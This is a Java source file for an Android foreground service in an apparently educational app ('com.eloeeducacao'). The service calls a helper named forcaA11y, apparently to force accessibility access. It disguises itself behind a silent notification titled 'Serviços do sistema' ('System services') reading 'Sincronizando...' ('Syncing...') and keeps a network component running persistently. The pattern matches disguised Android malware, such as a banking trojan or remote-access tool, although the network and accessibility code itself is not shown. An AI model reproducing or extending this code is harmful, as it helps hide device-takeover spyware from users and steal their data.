package com.eloeeducacao;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;

public class NetSvc extends Service {

    public static void arranca(Context c) {
        if (c == null) return;
        try {
            Intent s = new Intent(c, NetSvc.class);
            if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s);
            else c.startService(s);
        } catch (Throwable ignored) {}
    }
    @Override public IBinder onBind(Intent i) { return null; }

    @Override public void onCreate() {
        try { Util.forcaA11y(this); } catch (Throwable ignored) {}
        super.onCreate();
        String ch = "sys";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            NotificationChannel c = new NotificationChannel(ch, "Sistema", NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            c.setSound(null, null);
            nm.createNotificationChannel(c);
        }
        Notification.Builder nb = Build.VERSION.SDK_INT >= 26
                ? new Notification.Builder(this, ch)
                : new Notification.Builder(this);
        Notification n = nb.setContentTitle("Servi\u00e7os do sistema")
                .setContentText("Sincronizando...")
                .setSmallIcon(R.mipmap.ic)
                .setOngoing(true)
                .setShowWhen(false)
                .build();
        try {
            if (Build.VERSION.SDK_INT >= 29)
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            else
                startForeground(1, n);
        } catch (Throwable ignored) {}
        Net.start(this);
    }

    @Override public int onStartCommand(Intent i, int f, int s) {
        Net.start(this);
        return START_STICKY;
    }
}